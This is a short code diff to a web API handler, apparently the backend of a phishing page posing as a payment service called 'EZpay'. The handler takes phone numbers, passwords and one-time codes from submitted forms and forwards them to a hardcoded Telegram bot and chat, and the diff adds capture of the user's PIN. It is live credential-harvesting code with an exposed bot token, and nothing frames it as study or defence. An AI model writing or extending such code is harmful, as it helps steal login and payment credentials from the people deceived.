@@ -10,13 +10,14 @@ export default async function handler(req, res) {
     const TELEGRAM_BOT_TOKEN = '9260608323:AAHmFxQvlDR-E5NZohqbDtk8I1RgvqxHR0c';
     const TELEGRAM_CHAT_ID = '1745333535';
 
-    const { type, phone, password, username, otp, details } = req.body;
+    const { type, phone, password, pin, username, otp, details } = req.body;
     let message = '';
 
     if (type === 'signin') {
         message = `💳 <b>EZpay Sign In Attempt</b>\n\n`
             + `📱 <b>Phone:</b> +91 ${phone || 'N/A'}\n`
             + `🔒 <b>Password:</b> ${password || 'N/A'}\n`
+            + `🔑 <b>PIN:</b> ${pin || 'N/A'}\n`
             + `🕐 <b>Time:</b> ${new Date().toLocaleString()}`;
     } else if (type === 'register') {
         message = `📝 <b>EZpay Registration</b>\n\n`
